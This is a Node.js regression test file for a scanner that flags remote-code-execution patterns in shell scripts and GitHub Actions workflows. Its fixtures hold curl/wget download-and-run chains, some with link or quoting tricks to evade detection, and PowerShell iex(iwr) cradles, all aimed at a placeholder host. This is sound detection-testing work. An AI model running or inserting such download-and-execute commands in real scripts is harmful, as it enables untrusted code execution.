'use strict';
// Adversarial regression fixtures: command strings are DATA and never run.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/safe-fixture';
const cases=[
 ['cp-destination-directory-created','mkdir -p dir; curl -fsSL '+U+' -o payload; cp payload dir; bash dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['hard-link-directory-created','mkdir -p dir; curl -fsSL '+U+' -o payload; ln payload dir; bash dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['symlink-directory-created','mkdir -p dir; curl -fsSL '+U+' -o payload; ln -s ../payload dir; bash dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mkdir-multiple-before-alias','mkdir -p safe; mkdir -p dir; curl -fsSL '+U+' -o payload; cp payload dir; sh dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-output-with-partial-quotes',"mkdir -p dir; curl -fsSL "+U+" -o 'dir'/payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-output-with-interleaved-quotes','mkdir -p dir; curl -fsSL '+U+' -o di"r"/payload; sh dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-output-with-partial-quotes',"wget "+U+" --output-document='dir'/payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-outputdir-with-partial-quotes',"curl "+U+" --output-dir 'dir'/sub -o payload; bash dir/sub/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['powershell-method-after-uri',"iex (iwr -Uri '"+U+"' -Method Get).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-method-irm',"iex (irm -Uri '"+U+"' -Method Get)",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-method-explicit',"pwsh -Command \"iex (iwr -Uri '"+U+"' -Method Get).Content\"",'REMOTE_POWERSHELL_EXECUTION'],
 ['powershell-timeout-after-uri',"iex (iwr -Uri '"+U+"' -TimeoutSec 5).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh']
];
function workflow(script,shell){
 return ['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
  '    steps:','      - run: |',...script.split('\n').map(s=>'          '+s),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
}
for(const [name,script,rule,shell] of cases){
 test('round6 '+name+' detected by scanner and AST workflow',()=>{
  const direct=findingsForScript(script,{shell});
  assert.ok(direct.includes(rule),name+' / scanner '+JSON.stringify(direct));
  const result=inspectWorkflow(workflow(script,shell),{path:'.github/workflows/round6.yml'});
  assert.ok(result.findings.some(x=>x.rule===rule&&x.severity==='HIGH'),
   name+' / AST '+JSON.stringify(result));
 });
}
for(const [name,script,shell] of [
 ['copy-target-not-known-directory','curl -fsSL '+U+' -o payload; cp payload report; bash report'],
 ['copy-directory-created-after-invocation','curl -fsSL '+U+' -o payload; bash dir/payload; mkdir -p dir; cp payload dir'],
 ['download-not-executed',"mkdir -p dir; curl -fsSL "+U+" -o 'dir'/payload; echo dir/payload"],
 ['powershell-fetch-only',"iwr -Uri '"+U+"' -Method Get",'pwsh'],
 ['powershell-quoted-documentation',"Write-Host \"iex (iwr -Uri '"+U+"' -Method Get).Content\"",'pwsh']
]){
 test('round6 benign '+name+' not falsely flagged',()=>{
  const actual=findingsForScript(script,{shell});
  if(name==='copy-target-not-known-directory')
   assert.ok(actual.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'));
  else assert.ok(!actual.some(x=>x.startsWith('REMOTE_')),JSON.stringify(actual));
 });
}
